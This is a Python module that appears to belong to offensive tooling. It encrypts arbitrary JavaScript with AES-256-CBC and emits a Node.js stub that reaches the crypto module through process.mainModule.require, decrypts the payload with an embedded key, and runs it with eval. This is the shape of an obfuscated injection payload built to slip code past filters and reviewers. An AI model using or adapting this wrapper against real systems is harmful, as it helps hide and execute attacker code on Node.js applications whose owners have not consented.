"""Cryptographic utilities for payload encryption."""
import os
import base64
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def pkcs7_padding(data: bytes, block_size: int) -> bytes:
    """Apply PKCS7 padding to data."""
    return pad(data, block_size)


def aes_encrypt(plaintext: str) -> tuple[str, str, str]:
    """
    Encrypt plaintext using AES-256-CBC.
    
    Returns:
        Tuple of (encrypted_base64, key_hex, iv_hex)
    """
    # Generate random key and IV
    key = os.urandom(32)  # AES-256 key
    iv = os.urandom(16)   # AES block size
    
    # Create cipher
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Pad and encrypt
    plaintext_bytes = plaintext.encode('utf-8')
    padded_data = pkcs7_padding(plaintext_bytes, AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    
    # Encode results
    encrypted_b64 = base64.b64encode(encrypted).decode('ascii')
    key_hex = binascii.hexlify(key).decode('ascii')
    iv_hex = binascii.hexlify(iv).decode('ascii')
    
    return encrypted_b64, key_hex, iv_hex


def generate_encrypted_payload(js_code: str) -> str:
    """
    Generate encrypted payload wrapper for JavaScript code.
    
    Args:
        js_code: The JavaScript code to encrypt
        
    Returns:
        JavaScript stub code that decrypts and executes the payload
    """
    encrypted_data, key_hex, iv_hex = aes_encrypt(js_code)
    
    stub = f"""(function(){{
        try {{
            const c = process.mainModule.require('crypto');
            const k = Buffer.from('{key_hex}', 'hex');
            const i = Buffer.from('{iv_hex}', 'hex');
            const d = c.createDecipheriv('aes-256-cbc', k, i);
            let r = d.update('{encrypted_data}', 'base64', 'utf8');
            r += d.final('utf8');
            return eval(r);
        }} catch(e) {{ return 'Decrypt Error: ' + e.message; }}
    }})()"""
    
    return stub

